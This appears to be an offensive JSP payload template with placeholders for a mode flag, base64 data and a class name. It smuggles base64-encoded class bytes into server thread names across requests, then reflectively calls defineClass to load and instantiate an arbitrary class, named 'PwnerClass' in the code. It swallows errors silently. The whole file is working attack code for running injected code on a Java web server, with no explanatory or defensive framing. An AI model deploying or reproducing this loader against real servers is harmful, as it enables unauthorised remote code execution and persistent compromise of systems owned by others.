<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Field" %>
<%
    String flag = "%flag%";
    try {
        if (flag.equals("set")){
//            System.out.println("[+] set");
            String b64 = "%b64%";
            Thread t = Thread.currentThread();
            Field field = t.getThreadGroup().getClass().getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(t.getThreadGroup());
            boolean f = true;
            for(int i = 0; i < threads.length; ++i) {
                Thread z = threads[i];

                if (z != null){
                    if (z.getName().startsWith("1nhann")){
                        z.setName(z.getName()+b64);
                        f = false;
                    }
                }else {
//                    System.out.println("[+] this thread is null : " + String.valueOf(i));
                }
            }
            if (f){
                for (int i = 0; i < threads.length; ++i){
                    Thread z = threads[i];
                    if (z != null){
                        z.setName("1nhann" + b64);
                        break;
                    }
                }
            }
        }else if (flag.equals("load")){
//            System.out.println("[+] load");
            String className = "%className%";
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
                String.class,
                byte[].class,
                int.class,
                int.class
            );

            byte[] b = null;
            Thread t = Thread.currentThread();
            Field field = t.getThreadGroup().getClass().getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(t.getThreadGroup());
            for(int i = 0; i < threads.length; ++i) {
                Thread z = threads[i];

                if (z != null){
                    if (z.getName().startsWith("1nhann")){
                        String b64 = z.getName();
                        b64 = b64.substring("1nhann".length());
                        b = Base64.getDecoder().decode(b64);
                    }
                }else {
//                    System.out.println("[+] this thread is null : " + String.valueOf(i));
                }
            }
            defineClass.setAccessible(true);
            Class PwnerClass = (Class)defineClass.invoke(Thread.currentThread().getContextClassLoader(), className, b, 0, b.length);
//            System.out.println(PwnerClass);
            PwnerClass.newInstance();
        }else if (flag.equals("kill")){
//            System.out.println("[+] kill");
            Thread t = Thread.currentThread();
            Field field = t.getThreadGroup().getClass().getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(t.getThreadGroup());
            for(int i = 0; i < threads.length; ++i) {
                Thread z = threads[i];
                if (z != null){
                    if (z.getName().startsWith("1nhann")){
                        z.setName("");
                    }
                }else {
//                    System.out.println("[+] this thread is null : " + String.valueOf(i));
                }
            }
        }else if(flag.equals("debug")){
//            System.out.println("[+] debug");
            Thread t = Thread.currentThread();
            Field field = t.getThreadGroup().getClass().getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(t.getThreadGroup());
            for(int i = 0; i < threads.length; ++i) {
                Thread z = threads[i];
                if (z != null){
                    System.out.println("[+] " + z.getName());
                }else {
                    System.out.println("[+] this thread is null : " + String.valueOf(i));
                }

            }
        }
    }catch (Exception e){
//        e.printStackTrace();
    }

%>
